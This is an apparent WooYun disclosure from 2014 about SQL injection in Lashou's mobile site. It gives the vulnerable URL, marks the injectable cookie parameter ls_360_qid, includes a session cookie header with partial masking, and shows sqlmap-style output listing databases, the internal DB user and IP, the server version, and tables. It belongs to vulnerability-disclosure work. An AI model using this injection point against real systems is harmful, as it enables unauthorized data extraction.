wybug_title: 拉手网移动版存在SQL注入
wybug_detail: 漏洞详情 披露状态：   									2014-06-22：	细节已通知厂商并且等待厂商处理中									2014-06-23：	厂商已经确认，细节仅向厂商公开									2014-07-03：	细节向核心白帽子及相关领域专家公开									2014-07-13：	细节向普通白帽子公开									2014-07-23：	细节向实习白帽子公开									2014-08-06：	细节向公众公开  简要描述： m.lashou.com存在一处SQL注入漏洞，可导致信息泄露甚至shell 详细说明：  http://m.lashou.com/dobuy2.php?id=8284503&fr=0&city=shanghai&vt=3请先自行登录，获取cookike注入点：cookie中的ls_360_qidCookie:client_key=????921822w0f1eb49d??????????; city_b=2419; __utma=1.927891390.1401921846.1403153525.1403326279.11; __utmz=1.1403005204.5.2.utmcsr=i.links.cn|utmccn=(referral)|utmcmd=referral|utmcct=/subdomain/; version=1; Hm_lvt_c2eaab85259ff4e5e56f035ef5786907=1403326247; visit_city_string=shanghai; uuid=????342a714de40fe88eb739b576bbff4221?????; history=7877923%2C8284503%2C8293998; login_name2=????????%2540163.com; pwd2=????2bd3b12af723801d75????????; view_goods=%7B%228248991%22%3A8248991%2C%228148891%22%3A8148891%7D; Hm_lpvt_c2eaab85259ff4e5e56f035ef5786907=1403326247; ThinkID=1v1rfpu4bd5csuqo73fcfi1m82; cookie_check=1; __utmb=1.2.10.1403326279; __utmc=1;ls_360_qihoo_id=deleted; ls_360_ext=deleted; ls_360_qid=deleted*; ls_360_qmail=deleted; ls_360_qname=deleted   漏洞证明：  [*] address[*] datamining[*] dating[*] game_togo[*] hotel[*] house[*] hui[*] information_schema[*] lashoblog[*] lashou_activity[*] lashou_dianping[*] lashou_hotel[*] lashou_hui[*] lashou_jd[*] lashou_mall[*] lashou_sem[*] lashou_stat[*] lashou_stores[*] logs[*] mysql[*] nantong[*] slowlog[*] stats[*] test'thinklasho'user:    'StarCraft@10.168.7.4'version:    '5.1.57-community-log'Database: address[6 tables]+--------------+| address      || address_book || address_ext  || group_list   || groups       || uploads      |Database: addressTable: address[10 columns]+---------+| Column  |+---------+| face    || fmid    || id      || isbkack || mid     || pid     || pname   || same    || tyye    |   修复方案：  up to you!   版权声明：转载请注明来源 老妖@乌云
